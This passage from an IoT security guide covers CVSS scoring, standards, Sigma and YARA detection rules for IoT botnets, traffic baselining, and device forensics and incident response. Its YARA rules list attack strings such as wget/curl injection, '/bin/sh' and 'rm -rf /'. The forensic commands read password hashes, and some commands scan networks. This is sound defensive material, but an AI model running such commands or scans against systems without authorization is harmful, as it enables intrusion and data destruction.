# Output: passwords, keys, URLs, email addresses, IP addresses, potential backdoors
```

### 6.5 CVSS scoring for IoT-specific vulnerabilities

IoT vulnerabilities require careful CVSS scoring because the standard CVSS v3.1 metrics do not fully capture IoT-specific risk factors. Key adjustments:

**Attack Vector (AV):** Physical (P) for hardware-interface attacks (UART, JTAG, SPI — requires physical access to the device). Adjacent Network (A) for attacks requiring LAN access (UPnP exploitation, BLE attacks). Network (N) for remotely-exploitable vulnerabilities (TR-069, exposed web interfaces).

**User Interaction (UI):** Most IoT attacks require None (N) — the device has no user to interact with the attack.

**Scope (S):** Changed (C) is common in IoT because compromising one device often enables pivoting to the entire IoT network (shared credentials, flat network, trust relationships between devices).

**Environmental metrics:** IoT devices in critical infrastructure (medical devices, industrial control systems, building automation) should receive higher Environmental scores due to the safety and availability impact. A CVSS 7.5 vulnerability in a consumer camera may be a CVSS 9.0+ in a hospital patient monitor, due to the Modified Availability and Modified Safety metrics.

### 6.6 Reporting template for IoT security assessments

A structured IoT security assessment report should include: **Executive summary** (high-level findings, business risk, recommended priorities). **Scope and methodology** (devices tested, firmware versions, tools used, assessment dates). **Hardware findings** (accessible debug interfaces, flash dump results, debug protection bypass). **Firmware findings** (extracted credentials, vulnerable components with CVE references, binary analysis results). **Network findings** (protocol security, TLS validation, cloud API issues). **Risk matrix** (all findings scored with CVSS, CWE classification, and remediation priority). **Remediation recommendations** (specific, actionable — not generic "improve security" statements; include exact configuration changes, code fixes, and architectural recommendations). **Evidence appendix** (screenshots, command output, packet captures, extracted credentials — with sensitive data appropriately redacted).

---

## 7. IoT security standards and frameworks

### 7.1 OWASP IoT Top 10 (2018)

The ten most critical IoT security risks: (1) Weak/guessable/hardcoded passwords, (2) Insecure network services, (3) Insecure ecosystem interfaces (web/API/cloud/mobile), (4) Lack of secure update mechanism, (5) Use of insecure or outdated components, (6) Insufficient privacy protection, (7) Insecure data transfer and storage, (8) Lack of device management, (9) Insecure default settings, (10) Lack of physical hardening.

### 7.2 Regulatory frameworks

**ETSI EN 303 645** (European standard for consumer IoT security): 13 provisions including: no universal default passwords, implement a vulnerability disclosure policy, keep software updated, securely store sensitive security parameters, communicate securely, minimize exposed attack surfaces, ensure software integrity, ensure personal data is secure, make systems resilient to outages, examine telemetry data, and make it easy for users to delete data.

**NIST IR 8259** (Core Device Cybersecurity Capability Baseline): defines minimum security capabilities for IoT devices — device identification, device configuration, data protection, logical access control, software/firmware update, and cybersecurity state awareness.

**US Cyber Trust Mark** (announced 2023): a voluntary labeling program for consumer IoT devices that meet NIST-based security criteria. Certified devices display a shield logo, indicating they meet baseline security requirements.

**PSA Certified** (ARM-led, Platform Security Architecture): a certification framework for IoT device security, with four levels of assurance from self-assessment to comprehensive lab-based evaluation.

**SESIP** (Security Evaluation Standard for IoT Platforms): a GlobalPlatform standard providing five assurance levels for IoT platform security evaluation. SESIP maps to Common Criteria (ISO 15408) and PSA Certified, providing a unified evaluation methodology for IoT component security.

---

## 8. Detection engineering for IoT threats

### 8.1 Sigma rules for IoT attack detection

Detection engineering for IoT environments requires rules tuned to the constrained, predictable communication patterns of embedded devices. Unlike general-purpose endpoints, IoT devices have narrow behavioral baselines: they talk to a small set of cloud endpoints, use a limited set of protocols, and rarely deviate from their operational profile. This predictability makes anomaly-based detection highly effective when combined with signature-based rules.

**Rule 1 — Botnet C2 callback detection (outbound from IoT VLAN):**

```yaml
title: IoT Device Outbound C2 Callback — Anomalous External Connection
id: f8a2d1e0-c4b5-4f6a-b7d9-0e1f2a3b4c5d
status: stable
description: >
    Detects IoT devices initiating TCP connections to external IPs not in the
    device's known communication whitelist. IoT devices should only connect to
    their cloud backend, NTP, DNS, and update servers. Any other outbound
    connection is suspicious and may indicate botnet C2 registration.
logsource:
    category: firewall
    product: any
references:
    - https://attack.mitre.org/techniques/T1071/001/
date: 2025/06/10
tags:
    - attack.command_and_control
    - attack.t1071.001
    - attack.t1095
detection:
    selection:
        src_ip|cidr: "10.10.50.0/24"       # IoT VLAN — adjust per environment
        direction: outbound
        action: allow
    filter_known_destinations:
        dst_ip:
            - "203.0.113.10"                # vendor cloud backend
            - "203.0.113.11"                # NTP pool
            - "203.0.113.12"                # firmware update server
    condition: selection and not filter_known_destinations
falsepositives:
    - New legitimate cloud endpoint added by vendor firmware update
    - Captive portal redirect during initial provisioning
level: high
```

**Rule 2 — UPnP AddPortMapping exploitation from non-gateway device:**

```yaml
title: UPnP AddPortMapping Request from Non-Gateway Source
id: a1b2c3d4-e5f6-7890-abcd-ef1234567890
status: experimental
description: >
    Detects SOAP AddPortMapping requests to the router's UPnP control URL
    from devices that are not the gateway itself. Malware abuses UPnP IGD
    to open NAT mappings, exposing internal services to the internet.
logsource:
    category: proxy
    product: any
references:
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-12695
date: 2025/06/10
tags:
    - attack.persistence
    - attack.t1090
detection:
    selection:
        cs-method: POST
        cs-uri|contains: "/ctl/IPConn"
        request_body|contains: "AddPortMapping"
    filter_gateway:
        src_ip: "192.168.1.1"              # legitimate gateway self-management
    condition: selection and not filter_gateway
falsepositives:
    - Gaming consoles requesting UPnP port mappings (expected but should be audited)
level: high
```

**Rule 3 — TR-069 CWMP abuse (unauthorized ACS connection):**

```yaml
title: TR-069 CPE Connection to Unauthorized ACS
id: b2c3d4e5-f6a7-8901-bcde-f12345678901
status: stable
description: >
    Detects CPE devices connecting to TR-069 ACS endpoints that are not the
    ISP's legitimate ACS server. An attacker who redirects the ACS URL (via
    DNS hijack, CSRF, or Misfortune Cookie) gains full device control through
    SetParameterValues and Download RPCs.
logsource:
    category: firewall
    product: any
date: 2025/06/10
tags:
    - attack.command_and_control
    - attack.t1071.001
detection:
    selection:
        dst_port: 7547
        action: allow
    filter_legitimate_acs:
        dst_ip:
            - "198.51.100.10"              # ISP ACS primary
            - "198.51.100.11"              # ISP ACS secondary
    condition: selection and not filter_legitimate_acs
falsepositives:
    - ISP ACS migration to new infrastructure (update filter list)
level: critical
```

**Rule 4 — Firmware downgrade attempt (version regression in device telemetry):**

```yaml
title: IoT Firmware Downgrade — Version Regression Detected
id: c3d4e5f6-a7b8-9012-cdef-123456789012
status: experimental
description: >
    Detects firmware version regression on managed IoT devices. A downgrade
    to an older firmware version may indicate an attacker rolling back to a
    version with known exploitable vulnerabilities. Requires an asset
    management system that tracks device firmware versions over time.
logsource:
    category: application
    product: iot_management_platform
date: 2025/06/10
tags:
    - attack.defense_evasion
    - attack.t1562.001
detection:
    selection:
        event_type: "firmware_version_change"
    filter_upgrade:
        new_version|gt: old_version         # pseudo — implement as custom field comparison
    condition: selection and not filter_upgrade
falsepositives:
    - Intentional rollback by operations team (document in change management)
level: critical
```

**Rule 5 — Default credential brute-force against IoT management interfaces:**

```yaml
title: IoT Default Credential Brute-Force — Rapid Authentication Failures
id: d4e5f6a7-b8c9-0123-defa-234567890123
status: stable
description: >
    Detects rapid authentication failures against IoT device web management
    interfaces, indicating credential stuffing with default password lists.
    IoT devices typically run lightweight HTTP servers (GoAhead, lighttpd,
    mini_httpd) with basic authentication.
logsource:
    category: webserver
    product: any
date: 2025/06/10
tags:
    - attack.credential_access
    - attack.t1110.001
    - attack.t1078.001
detection:
    selection:
        sc-status: 401
        cs-uri|contains:
            - "/login"
            - "/cgi-bin/weblogin.cgi"
            - "/userRpm/LoginRpm.htm"
            - "/HNAP1/"
    timeframe: 120s
    condition: selection | count() by src_ip > 15
falsepositives:
    - Legitimate user who forgot password (low volume, single source)
level: high
```

**Rule 6 — Cross-VLAN lateral movement from IoT segment:**

```yaml
title: IoT VLAN Lateral Movement — Cross-Segment Connection Attempt
id: e5f6a7b8-c9d0-1234-efab-345678901234
status: stable
description: >
    Detects IoT devices attempting connections to non-IoT network segments.
    IoT VLANs should be isolated; any connection attempt to corporate LAN,
    management VLAN, or server segments indicates compromise or misconfiguration.
logsource:
    category: firewall
    product: any
date: 2025/06/10
tags:
    - attack.lateral_movement
    - attack.t1021
    - attack.t1210
detection:
    selection:
        src_ip|cidr: "10.10.50.0/24"       # IoT VLAN
    filter_allowed_destinations:
        dst_ip|cidr:
            - "10.10.50.0/24"              # intra-VLAN (device-to-device if permitted)
            - "203.0.113.0/24"             # cloud backend
    condition: selection and not filter_allowed_destinations
falsepositives:
    - IoT gateway device performing legitimate cross-VLAN routing (whitelist by IP)
level: critical
```

**Rule 7 — DNS rebinding attack targeting IoT devices:**

```yaml
title: DNS Rebinding Attack — Rapid DNS TTL Change to Private IP
id: f6a7b8c9-d0e1-2345-fabc-456789012345
status: experimental
description: >
    Detects DNS responses that resolve an external domain to a private IP
    address with a very short TTL. DNS rebinding attacks trick a browser or
    application into treating an attacker-controlled domain as a local
    resource, bypassing same-origin restrictions to access IoT device APIs
    on the LAN. Singularity of Origin (NCC Group) automates this attack.
logsource:
    category: dns_server
    product: any
references:
    - https://github.com/nccgroup/singularity
date: 2025/06/10
tags:
    - attack.initial_access
    - attack.t1189
detection:
    selection:
        answer|re: "^(10\\.|172\\.(1[6-9]|2[0-9]|3[01])\\.|192\\.168\\.)"
        query_type: "A"
    filter_internal_zones:
        query|endswith:
            - ".local"
            - ".internal"
            - ".corp"
    condition: selection and not filter_internal_zones
falsepositives:
    - Split-horizon DNS returning private IPs for internal domains
level: high
```

**Rule 8 — IoT cryptomining detection (abnormal CPU/network pattern):**

```yaml
title: IoT Device Cryptomining — Stratum Protocol Connection
id: a7b8c9d0-e1f2-3456-abcd-567890123456
status: stable
description: >
    Detects IoT devices connecting to known Stratum mining pool ports or
    sending Stratum protocol JSON-RPC payloads. Compromised IoT devices
    (particularly ARM-based with moderate CPU) are increasingly used for
    cryptomining. While individually slow, botnets of thousands of devices
    generate meaningful hash rates.
logsource:
    category: firewall
    product: any
date: 2025/06/10
tags:
    - attack.impact
    - attack.t1496
detection:
    selection_ports:
        src_ip|cidr: "10.10.50.0/24"       # IoT VLAN
        dst_port:
            - 3333
            - 3334
            - 4444
            - 5555
            - 7777
            - 8888
            - 9999
            - 14444
            - 14433
    selection_stratum:
        request_body|contains:
            - "mining.subscribe"
            - "mining.authorize"
            - "mining.submit"
    condition: selection_ports or selection_stratum
falsepositives:
    - Legitimate applications using coincidental port numbers (verify payload)
level: critical
```

### 8.2 YARA rules for IoT malware variant detection

Beyond the generic Mirai and Mozi rules in §2.8, detection engineering requires rules for evolving variants and newly-emerging IoT malware families.

**BotenaGo variant detection:**

BotenaGo (discovered 2021) is written in Go and targets over 30 CVEs in routers, modems, and NAS devices. Its Go compilation produces large, statically-linked binaries with distinctive Go runtime strings. The malware creates backdoor listeners on ports 31412 and 19412.

```yara
rule BotenaGo_Variant {
    meta:
        description = "Detects BotenaGo IoT malware — Go-compiled, multi-CVE exploit payload"
        author = "IoT Detection Engineering"
        date = "2025-06-10"
        severity = "critical"
        reference = "AT&T Alien Labs BotenaGo analysis"
    strings:
        // Go runtime indicators (statically linked Go binary)
        $go1 = "runtime.goexit" ascii
        $go2 = "runtime.gopanic" ascii

        // BotenaGo backdoor listener indicators
        $bd1 = "31412" ascii
        $bd2 = "19412" ascii
        $bd3 = "/bin/sh" ascii

        // Exploit payload strings (CVE targets)
        $exp1 = "/cgi-bin/supervisor/PwdGrp.cgi" ascii       // CVE-2020-8515 DrayTek
        $exp2 = "/picsdesc.xml" ascii                          // CVE-2014-8361 Realtek
        $exp3 = "/HNAP1/" ascii                                // D-Link HNAP RCE
        $exp4 = "/goform/set_LimitClient_cfg" ascii            // CVE-2020-10987 Tenda
        $exp5 = "/GponForm/diag_Form" ascii                    // CVE-2018-10561 GPON

        // Common command injection delimiters in exploit payloads
        $inj1 = ";wget " ascii
        $inj2 = "$(curl " ascii
        $inj3 = "|/bin/sh" ascii

    condition:
        filesize > 1MB and filesize < 10MB and      // Go binaries are large
        (2 of ($go*)) and
        (1 of ($bd*)) and
        (3 of ($exp*)) and
        (1 of ($inj*))
}
```

**HEH botnet detection (peer-to-peer, wiper capability):**

```yara
rule HEH_Botnet {
    meta:
        description = "Detects HEH P2P IoT botnet — Go-compiled with wiper functionality"
        date = "2025-06-10"
        severity = "critical"
    strings:
        $go1 = "runtime.goexit" ascii
        $p2p1 = "peer_list" ascii
        $p2p2 = "bootstrap_node" ascii
        $wiper1 = "dd if=/dev/zero" ascii
        $wiper2 = "rm -rf /" ascii
        $wiper3 = "mkfs" ascii
        $scan1 = ":23" ascii
        $scan2 = ":2323" ascii
        $scan3 = "root" ascii

    condition:
        (2 of ($p2p*)) and
        (1 of ($wiper*)) and
        (2 of ($scan*))
}
```

**Enemybot variant detection (Mirai + Gafgyt hybrid with enterprise CVEs):**

```yara
rule Enemybot_Variant {
    meta:
        description = "Detects Enemybot — Mirai derivative with enterprise CVE exploits"
        date = "2025-06-10"
        severity = "critical"
        reference = "Fortinet FortiGuard Labs Enemybot analysis"
    strings:
        // Mirai heritage — scanner/killer patterns
        $mirai1 = "ECCHI" ascii
        $mirai2 = "/proc/%d/cmdline" ascii
        $mirai3 = "TSource Engine Query" ascii     // Valve Source Engine flood

        // Enterprise CVE exploit strings
        $cve1 = "VMware" ascii
        $cve2 = "Spring4Shell" ascii
        $cve3 = "Log4j" ascii
        $cve4 = "F5" ascii
        $cve5 = "CVE-2022-22954" ascii             // VMware Workspace ONE
        $cve6 = "CVE-2022-1388" ascii              // F5 BIG-IP

        // Gafgyt DDoS method identifiers
        $ddos1 = "HOLD_FLOOD" ascii
        $ddos2 = "JUNK_FLOOD" ascii
        $ddos3 = "UDP_BYPASS" ascii

    condition:
        uint32(0) == 0x464C457F and
        (2 of ($mirai*)) and
        (2 of ($cve*)) and
        (1 of ($ddos*))
}
```

### 8.3 Network monitoring and traffic baselining

IoT network monitoring relies on the principle that IoT devices are highly predictable. A smart thermostat communicates with a narrow set of cloud endpoints, at regular intervals, using consistent packet sizes. Any deviation from this baseline warrants investigation.

**Traffic baselining methodology:**

1. **Discovery phase (passive, 7–14 days).** Mirror the IoT VLAN's switch port to a monitoring host. Capture NetFlow/IPFIX records or full PCAP. Record per-device: destination IPs, destination ports, protocol (TCP/UDP), average bytes per flow, flow frequency, DNS queries, TLS SNI values.

2. **Profile generation.** For each device, generate a communication profile:

```bash
# Extract unique destination IPs per device from NetFlow data
nfdump -r /var/flow/nfcapd.202506* -A srcip,dstip \
    -o "fmt:%sa %da %byt %pkt %fl" \
    'src net 10.10.50.0/24' | sort -k1,1 -k2,2 | uniq -c | sort -rn > iot_flow_profiles.txt

# Extract DNS query patterns from passive DNS logs
grep "10.10.50." /var/log/dns/passive_dns.log | \
    awk '{print $4, $7}' | sort | uniq -c | sort -rn > iot_dns_profiles.txt

# Generate per-device traffic summary with tshark
tshark -r iot_vlan_capture.pcap -q -z endpoints,ip \
    -Y "ip.src == 10.10.50.0/24" > iot_endpoint_summary.txt
```

3. **Anomaly threshold configuration.** Establish thresholds based on the baseline period: flag any device contacting an IP not observed during baseline, flag any device exceeding 2x its baseline bandwidth, flag any device using a port not observed during baseline, and flag any device whose DNS query pattern diverges from baseline.

**MUD (Manufacturer Usage Description) — RFC 8520:**

MUD provides a standardized mechanism for IoT devices to declare their intended network behavior. The device emits a MUD URL (via DHCP option 161, LLDP extension, or during 802.1X authentication). The network infrastructure fetches the MUD file (a JSON document describing allowed communication patterns) and automatically configures access control.

```json
{
  "ietf-mud:mud": {
    "mud-version": 1,
    "mud-url": "https://vendor.example.com/mud/smartcamera-v2",
    "last-update": "2025-06-10T00:00:00Z",
    "cache-validity": 48,
    "is-supported": true,
    "systeminfo": "Smart Camera Model X v2.0",
    "from-device-policy": {
      "access-lists": {
        "access-list": [
          {
            "name": "camera-outbound",
            "aces": {
              "ace": [
                {
                  "name": "allow-cloud-backend",
                  "matches": {
                    "ipv4": { "ietf-acldns:dst-dnsname": "api.vendor.example.com" },
                    "tcp": { "destination-port": { "port": 443 } }
                  },
                  "actions": { "forwarding": "accept" }
                },
                {
                  "name": "allow-ntp",
                  "matches": {
                    "ipv4": { "ietf-acldns:dst-dnsname": "pool.ntp.org" },
                    "udp": { "destination-port": { "port": 123 } }
                  },
                  "actions": { "forwarding": "accept" }
                },
                {
                  "name": "deny-all-other",
                  "actions": { "forwarding": "drop" }
                }
              ]
            }
          }
        ]
      }
    },
    "to-device-policy": {
      "access-lists": {
        "access-list": [
          {
            "name": "camera-inbound",
            "aces": {
              "ace": [
                {
                  "name": "allow-cloud-push",
                  "matches": {
                    "ipv4": { "ietf-acldns:src-dnsname": "api.vendor.example.com" },
                    "tcp": { "source-port": { "port": 443 } }
                  },
                  "actions": { "forwarding": "accept" }
                },
                {
                  "name": "deny-all-other",
                  "actions": { "forwarding": "drop" }
                }
              ]
            }
          }
        ]
      }
    }
  }
}
```

MUD enforcement on Cisco ISE: the RADIUS server receives the MUD URL during 802.1X authentication, fetches the MUD file, translates it into a downloadable ACL (dACL), and applies it to the switch port. The osMUD project (open-source) provides a lightweight MUD controller for OpenWrt-based environments.

### 8.4 Passive IoT discovery and fingerprinting

Accurate device inventory is a precondition for detection engineering. Most IoT devices cannot run endpoint agents, so discovery must be passive or use lightweight active probing.

**Passive fingerprinting with network traffic analysis:**

```bash
# DHCP fingerprinting — extract vendor class identifiers
tshark -r capture.pcap -Y "bootp.option.type == 60" \
    -T fields -e bootp.hw.mac_addr -e bootp.option.hostname \
    -e bootp.option.vendor_class_id > dhcp_fingerprints.csv

# mDNS/DNS-SD service discovery
tshark -r capture.pcap -Y "mdns" \
    -T fields -e ip.src -e dns.qry.name -e dns.resp.name | sort -u > mdns_services.txt

# SSDP UPnP device announcements
tshark -r capture.pcap -Y "ssdp" \
    -T fields -e ip.src -e http.server -e http.location > ssdp_devices.txt

# TLS Client Hello fingerprinting (JA3 hash)
tshark -r capture.pcap -Y "tls.handshake.type == 1" \
    -T fields -e ip.src -e tls.handshake.extensions.server_name \
    -e tls.handshake.ja3 > tls_ja3_fingerprints.csv
```

**Active fingerprinting with nmap:**

```bash
# Targeted IoT scan — service detection + OS fingerprint + common IoT scripts
nmap -sV -O --script=http-title,http-headers,upnp-info,mqtt-subscribe \
    -p 23,80,443,554,1883,5353,7547,8080,8443,8883,49152 \
    10.10.50.0/24 -oA iot_scan_results

# Shodan passive scan for external-facing IoT devices (authorized scope only)
shodan search "port:1883 MQTT" --fields ip_str,port,org,product --limit 100
shodan search "port:7547 TR-069" --fields ip_str,port,org,product --limit 100
```

### 8.5 IoT security platform integration

Enterprise IoT security platforms provide agentless discovery, behavioral profiling, vulnerability assessment, and policy enforcement at scale. Integration with existing SOC tooling is critical.

**Armis** operates as a passive network sensor that fingerprints devices based on traffic patterns, wireless protocols (BLE, Zigbee, Wi-Fi), and behavioral signatures. Integration: Armis feeds device-context alerts into SIEM (Splunk, Sentinel, QRadar) via syslog/CEF or REST API. SOC analysts receive enriched alerts with device type, manufacturer, firmware version, known CVEs, and risk score alongside standard network alerts.

**Claroty (xDome)** specializes in OT/IoT convergence environments. It performs Deep Packet Inspection (DPI) on industrial protocols (Modbus, BACnet, EtherNet/IP, DNP3) alongside IoT protocols (MQTT, CoAP). Claroty generates virtual zones based on observed communication patterns and alerts on policy violations (cross-zone traffic, unauthorized protocol usage).

**Nozomi Networks (Guardian/Vantage)** combines passive monitoring with active querying for OT/IoT hybrid environments. Its asset intelligence engine fingerprints devices from network metadata and protocol-specific fields. Nozomi's Threat Intelligence feed includes IoT-specific indicators (botnet C2 infrastructure, compromised device behavioral signatures).

**SIEM integration pattern for IoT security platforms:**

```
IoT Platform (Armis/Claroty/Nozomi)
    → Syslog/CEF → SIEM ingestion pipeline
    → Enrichment: device_type, firmware_version, known_cves, risk_score
    → Correlation: IoT alert + firewall log + DNS log = enriched incident
    → SOAR playbook: auto-isolate device via NAC (ISE, ClearPass, Forescout)
```

The key value of platform integration is context: a firewall alert showing "10.10.50.42 connected to suspicious IP" becomes actionable when enriched with "10.10.50.42 is an Axis M3045 IP camera running firmware 9.80.1, which has CVE-2021-51764 (CVSS 9.8), and its traffic profile has deviated 340% from baseline in the last hour."

---

## 9. IoT forensics and incident response

### 9.1 Device forensic acquisition

IoT forensics differs fundamentally from traditional digital forensics. IoT devices lack standard storage interfaces, run RTOS or stripped-down Linux with no forensic agent support, may have volatile evidence in RAM that disappears on power loss, and often feature tamper-evident enclosures whose opening may be legally significant.

**Serial console acquisition:**

When the device exposes a UART console (§1.1), it may provide the most accessible forensic interface. Log the entire serial session from the moment of connection:

```bash
# Start timestamped serial logging before powering on the device
script -t 2>timing.log -a serial_capture.log picocom -b 115200 /dev/ttyUSB0

# Once at a shell, capture forensic artifacts:
cat /proc/version                              # kernel version
cat /proc/cmdline                              # boot parameters
cat /proc/mtd                                  # flash partition map
cat /etc/shadow                                # password hashes
cat /etc/passwd                                # user accounts
cat /tmp/resolv.conf                           # DNS config (may show attacker DNS)
ls -laR /etc/init.d/                           # startup scripts (persistence)
ls -laR /tmp/                                  # temporary files (malware staging area)
crontab -l                                     # scheduled tasks (persistence)
iptables -L -n                                 # firewall rules (botnet competitor blocking)
netstat -tulnp                                 # active network connections
ps aux                                         # running processes
md5sum /usr/bin/* /usr/sbin/* /bin/* /sbin/*    # binary integrity hashes
dmesg | head -200                              # kernel ring buffer

# Dump flash partitions for offline analysis
for mtd in /dev/mtd*ro; do
    name=$(grep "$(basename "$mtd" | tr -d 'ro')" /proc/mtd | awk -F\" '{print $2}')
    dd if="$mtd" of="/tmp/${name}.bin" 2>/dev/null
done
# Transfer dumps off-device via netcat or tftp
```

**JTAG/SWD forensic acquisition:**

JTAG provides the most complete memory acquisition, capturing both flash and RAM contents without relying on the device's software stack (which may be compromised):

```bash
# OpenOCD memory dump — captures full address space
openocd -f interface/jlink.cfg -f target/nrf52.cfg \
    -c "init; halt; flash read_bank 0 /evidence/flash_dump.bin; \
        dump_image /evidence/ram_dump.bin 0x20000000 0x40000; \
        resume; shutdown"

# Timestamp and hash all evidence immediately
date -u +"%Y-%m-%dT%H:%M:%SZ" > /evidence/acquisition_timestamp.txt
sha256sum /evidence/*.bin > /evidence/checksums.sha256
```

**Flash chip desoldering (chip-off forensics):**

When software-based extraction is impossible (debug ports disabled, device bricked, or compromised firmware blocks access), physical chip removal is the last resort:

1. Identify the flash chip (SPI NOR, eMMC, NAND) from PCB markings and datasheets.
2. Desolder using hot-air rework station (typical profile for SOIC-8 SPI: 350°C, medium airflow, 30–60 seconds). Use flux generously and protect adjacent components with Kapton tape.
3. Mount the chip in an appropriate socket (SOIC-8 clip, BGA socket, or solder to breakout board).
4. Read with flashrom (SPI NOR), or an eMMC reader (Medusa Pro, Easy JTAG) for eMMC.
5. Verify read integrity with double-read comparison (two reads must produce identical hashes).

```bash
# Chip-off SPI flash read and verification
flashrom -p ch341a_spi -r /evidence/chipoff_read1.bin
flashrom -p ch341a_spi -r /evidence/chipoff_read2.bin
sha256sum /evidence/chipoff_read1.bin /evidence/chipoff_read2.bin
# Hashes MUST match — mismatch indicates unreliable read (clean contacts, reduce speed)
```

### 9.2 RTOS memory forensics

Many IoT devices run RTOS (FreeRTOS, Zephyr, ThreadX, VxWorks) rather than Linux. RTOS forensics requires understanding the specific memory layout and data structures of the target RTOS.

**FreeRTOS task state extraction:**

FreeRTOS maintains task control blocks (TCBs) in a linked list. A RAM dump obtained via JTAG can be parsed to extract task names, stack pointers, priorities, and stack contents:

```python
"""Parse FreeRTOS TCB structures from a RAM dump. Offsets are for ARM Cortex-M, FreeRTOS 10.x."""
import struct

# TCB structure offsets (ARM Cortex-M, FreeRTOS 10.4+)
TCB_STACK_PTR_OFFSET = 0x00          # pxTopOfStack (4 bytes)
TCB_LIST_ITEM_OFFSET = 0x04          # xStateListItem (20 bytes)
TCB_EVENT_LIST_OFFSET = 0x18         # xEventListItem (20 bytes)
TCB_PRIORITY_OFFSET = 0x2C           # uxPriority (4 bytes)
TCB_STACK_BASE_OFFSET = 0x30         # pxStack (4 bytes)
TCB_NAME_OFFSET = 0x34               # pcTaskName (configMAX_TASK_NAME_LEN bytes, default 16)

def parse_tcb(ram_dump: bytes, tcb_addr: int, ram_base: int = 0x20000000) -> dict:
    offset = tcb_addr - ram_base
    stack_ptr = struct.unpack_from("<I", ram_dump, offset + TCB_STACK_PTR_OFFSET)[0]
    priority = struct.unpack_from("<I", ram_dump, offset + TCB_PRIORITY_OFFSET)[0]
    stack_base = struct.unpack_from("<I", ram_dump, offset + TCB_STACK_BASE_OFFSET)[0]
    name_bytes = ram_dump[offset + TCB_NAME_OFFSET : offset + TCB_NAME_OFFSET + 16]
    name = name_bytes.split(b"\x00")[0].decode("ascii", errors="replace")
    return {
        "address": hex(tcb_addr), "name": name, "priority": priority,
        "stack_ptr": hex(stack_ptr), "stack_base": hex(stack_base)
    }
```

**VxWorks symbol table extraction:**

VxWorks includes a symbol table in the firmware image that maps function names to addresses. Extracting this table dramatically accelerates reverse engineering:

```bash
# Search for VxWorks symbol table signature in flash dump
strings -t x /evidence/flash_dump.bin | grep -E "^[0-9a-f]+ [a-zA-Z_][a-zA-Z0-9_]+" | head -50

# Use vxworks-research-toolkit (Attify) for automated extraction
python3 vxworks_tool.py --firmware /evidence/flash_dump.bin --extract-symtab \
    --output /evidence/vxworks_symbols.txt
```

### 9.3 Network forensics for IoT protocols

IoT incidents often leave their primary evidence trail in network captures rather than on the device itself (constrained storage, no logging daemon, volatile filesystem). PCAP analysis for IoT-specific protocols requires specialized dissection.

**MQTT PCAP analysis:**

MQTT is the dominant IoT messaging protocol. Compromised devices may publish sensitive data to attacker-controlled topics, subscribe to C2 command topics, or exploit broker misconfigurations.

```bash
# Extract all MQTT PUBLISH messages from a PCAP (topic + payload)
tshark -r iot_incident.pcap -Y "mqtt.msgtype == 3" \
    -T fields -e frame.time -e ip.src -e ip.dst \
    -e mqtt.topic -e mqtt.msg > mqtt_publish_messages.txt

# Extract MQTT CONNECT packets (client ID, username — credentials in transit)
tshark -r iot_incident.pcap -Y "mqtt.msgtype == 1" \
    -T fields -e frame.time -e ip.src \
    -e mqtt.clientid -e mqtt.username -e mqtt.passwd > mqtt_credentials.txt

# Filter for suspicious MQTT topics (C2, exfiltration)
tshark -r iot_incident.pcap -Y 'mqtt.topic contains "cmd" or mqtt.topic contains "shell" \
    or mqtt.topic contains "exec" or mqtt.topic contains "update"' \
    -T fields -e frame.time -e ip.src -e mqtt.topic -e mqtt.msg
```

**CoAP PCAP analysis:**

CoAP (Constrained Application Protocol) operates over UDP port 5683 (or 5684 for DTLS). Forensic analysis focuses on unauthorized resource access and payload exfiltration:

```bash
# Extract CoAP requests and responses
tshark -r iot_incident.pcap -Y "coap" \
    -T fields -e frame.time -e ip.src -e ip.dst \
    -e coap.code -e coap.opt.uri_path_recon -e coap.payload > coap_traffic.txt

# Filter for CoAP PUT/POST (potential C2 commands or unauthorized configuration changes)
tshark -r iot_incident.pcap \
    -Y "coap.code == 2 or coap.code == 3" \
    -T fields -e frame.time -e ip.src -e coap.opt.uri_path_recon -e coap.payload
```

### 9.4 Log analysis for IoT cloud platforms

IoT incidents frequently involve the cloud management plane. Cloud-side logs provide visibility into device authentication, message routing, shadow/twin manipulation, and OTA update delivery that device-side forensics cannot capture.

**AWS IoT Core log analysis:**

```bash
# CloudWatch Logs Insights query — identify unauthorized device connections
# (devices connecting from unexpected IPs or with expired certificates)
fields @timestamp, clientId, sourceIp, eventType, details
| filter eventType = "CONNECT"
| filter sourceIp not like /^10\.10\.50\./       # expected IoT VLAN range
| sort @timestamp desc
| limit 200

# Identify shadow/twin manipulation (attacker modifying device desired state)
fields @timestamp, clientId, eventType, topicName
| filter topicName like /\$aws\/things\/.*\/shadow\/update/
| filter eventType = "PUBLISH"
| sort @timestamp desc

# Detect unauthorized OTA job creation
fields @timestamp, principalId, eventType, resources
| filter eventType = "CreateJob" or eventType = "CreateOTAUpdate"
| sort @timestamp desc
```

**Azure IoT Hub audit log analysis:**

```bash
# Azure CLI — query IoT Hub diagnostic logs for suspicious activity
az monitor log-analytics query -w <workspace-id> --analytics-query "
    AzureDiagnostics
    | where ResourceProvider == 'MICROSOFT.DEVICES'
    | where Category == 'Connections'
    | where ResultType != 'Success'
    | project TimeGenerated, DeviceId, CallerIPAddress, ResultType, ResultDescription
    | order by TimeGenerated desc
    | take 200
"

# Query for device twin changes (unauthorized configuration modification)
az monitor log-analytics query -w <workspace-id> --analytics-query "
    AzureDiagnostics
    | where ResourceProvider == 'MICROSOFT.DEVICES'
    | where Category == 'TwinQueries' or Category == 'Routes'
    | where OperationName contains 'twin'
    | project TimeGenerated, DeviceId, OperationName, CallerIPAddress
    | order by TimeGenerated desc
"
```

### 9.5 IoT incident response workflow

The IR workflow for IoT environments adapts traditional PICERL (Preparation, Identification, Containment, Eradication, Recovery, Lessons Learned) to the constraints of embedded devices.

**Phase 1 — Containment (immediate, within minutes):**

IoT containment must be network-based because device-level isolation (quarantine agent, EDR) is not possible on most IoT hardware.

1. **Network isolation.** Apply an ACL on the IoT VLAN's gateway router to block all egress from the affected device(s) while preserving intra-VLAN traffic for forensic capture. If using 802.1X with NAC (ISE, ClearPass), move the device to a quarantine VLAN via RADIUS CoA (Change of Authorization).
2. **DNS sinkhole.** If the compromised device is communicating with a C2 domain, add the domain to the internal DNS resolver's sinkhole list. This neutralizes C2 without alerting the attacker (the device still resolves the domain, but reaches a controlled IP).
3. **Do NOT power off.** RAM contains volatile evidence (running processes, network connections, decrypted keys, malware code). Power loss destroys this. If possible, perform a live RAM acquisition via JTAG before any further action.

**Phase 2 — Evidence collection (within hours):**

1. Capture full PCAP from the quarantine VLAN for the duration of the incident.
2. Perform device acquisition (§9.1) — JTAG RAM dump, flash dump, serial console log.
3. Collect cloud-side logs (§9.4) — device connection logs, shadow/twin change logs, OTA job logs.
